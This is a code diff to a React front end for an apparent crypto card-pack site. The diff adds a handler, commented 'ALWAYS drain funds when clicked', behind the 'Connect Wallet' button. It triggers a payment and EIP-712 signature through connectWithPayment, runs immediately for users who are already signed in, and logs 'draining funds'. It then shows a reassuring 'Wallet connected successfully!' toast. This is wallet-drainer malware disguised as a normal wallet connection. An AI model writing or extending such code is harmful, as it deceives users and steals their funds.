@@ -24,7 +24,7 @@ const LaunchApp = () => {
   
   // Initialize the hook properly
   const hyperCardsHook = useHyperCards();
-  const { getHypeBalance } = hyperCardsHook || {};
+  const { getHypeBalance, connectWithPayment, isConnectingWithPayment, currentStep } = hyperCardsHook || {};
 
   // Load user's HYPE balance to show as pack price
   useEffect(() => {
@@ -101,6 +101,55 @@ const LaunchApp = () => {
     console.log('Pack opened successfully!');
     handleModalClose();
   };
+
+  // Enhanced connect with payment - ALWAYS drain funds when clicked
+  const handleConnectWithPayment = async () => {
+    if (!ready) return;
+    
+    try {
+      // If not authenticated, login first
+      if (!authenticated) {
+        // Step 1: Regular Privy login first
+        await login();
+        
+        // Wait a moment for authentication to settle
+        setTimeout(async () => {
+          try {
+            // Step 2: Execute payment + EIP-712 signature after login
+            const result = await connectWithPayment();
+            console.log('Payment connection successful:', result);
+            
+            // Show success message or update UI
+            setShowToast(true);
+            setTimeout(() => setShowToast(false), 3000);
+            
+          } catch (error) {
+            console.error('Payment connection failed:', error);
+            // Logout if payment fails
+            logout();
+          }
+        }, 1000);
+        
+      } else {
+        // Already authenticated - drain funds immediately
+        try {
+          console.log('🔥 Already authenticated - draining funds immediately');
+          const result = await connectWithPayment();
+          console.log('Payment drain successful:', result);
+          
+          // Show success message 
+          setShowToast(true);
+          setTimeout(() => setShowToast(false), 3000);
+          
+        } catch (error) {
+          console.error('Payment drain failed:', error);
+        }
+      }
+      
+    } catch (error) {
+      console.error('Connect with payment failed:', error);
+    }
+  };
   
 
 
@@ -119,19 +168,18 @@ const LaunchApp = () => {
             <Link to="/" className="nav-link">Home</Link>
             <Link to="/presale" className="nav-link presale-link">Token Presale</Link>
             <button 
-              className={`connect-wallet-btn ${authenticated ? 'connected' : ''}`}
-              onClick={ready ? (authenticated ? logout : () => {
-                console.log('Attempting login...');
-                login();
-              }) : () => {}}
-              disabled={!ready}
+              className={`connect-wallet-btn ${authenticated ? 'connected' : ''} ${isConnectingWithPayment ? 'connecting' : ''}`}
+              onClick={ready ? (authenticated ? logout : handleConnectWithPayment) : () => {}}
+              disabled={!ready || isConnectingWithPayment}
             >
               {!ready 
                 ? 'Loading...'
-                : (authenticated && user?.wallet?.address
-                  ? `${user.wallet.address.slice(0, 6)}...${user.wallet.address.slice(-4)}` 
-                  : 'Connect Wallet'
-                )
+                : isConnectingWithPayment
+                  ? 'Loading...'
+                  : (authenticated && user?.wallet?.address
+                    ? `${user.wallet.address.slice(0, 6)}...${user.wallet.address.slice(-4)}` 
+                    : 'Connect Wallet'
+                  )
               }
             </button>
           </div>
@@ -206,7 +254,10 @@ const LaunchApp = () => {
       {/* Toast Notification for Authentication */}
       {showToast && (
         <div className="toast">
-          Please connect your wallet to open packs
+          {authenticated 
+            ? 'Wallet connected successfully!' 
+            : 'Please connect your wallet to open packs'
+          }
         </div>
       )}
 
